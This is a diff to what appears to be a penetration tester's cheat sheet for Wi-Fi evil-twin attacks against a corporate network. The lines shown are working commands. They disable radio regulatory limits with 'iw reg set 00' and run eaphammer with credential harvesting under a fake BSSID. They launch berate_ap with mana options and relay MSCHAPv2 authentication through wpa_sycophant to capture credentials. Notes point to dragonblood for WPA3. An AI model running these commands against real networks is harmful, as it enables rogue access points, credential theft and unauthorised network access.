@@ -47,13 +47,29 @@ sudo su
 iw reg get
 #Remove radio regulations
 iw reg set 00
+#reset usb
+usbreset
+#
 ./eaphammer -i wlan0 --channel 36 --auth wpa-eap --essid BLAH_CORP --creds --bssid <fakeBSSID> --hw-mode a --mana
 #Capture the packets exchanged during evilTwin
 sudo tcpdump -i wlan0 -w evilTwinBLAH_CORP.pcap
 
+#EvilTwin on OPEN network:
+#hostile portal
+
+
+#EvilTwin on EAP-TLS
+berate_ap -c 1 --eap --mana-eaptls --mana-eapsuccess ...
+
+
 #EvilTwin + MSCHAPv2 relay
 berate_ap --eap --mana-wpe --wpa-sycophant --mana-credout eviltwinCreds.out wlan0 wlan1 <SSID>
 ./wpa_sycophant.sh -c wpa_sycophant.conf -i wlan
+
+
+#EAP-PWD and WPA3
+#rely on dragonfly handshakes
+# check dragonblood
 
 #connect to EAP-PEAP wifi network
 #Add the following to a wpa_supplicant.conf file:
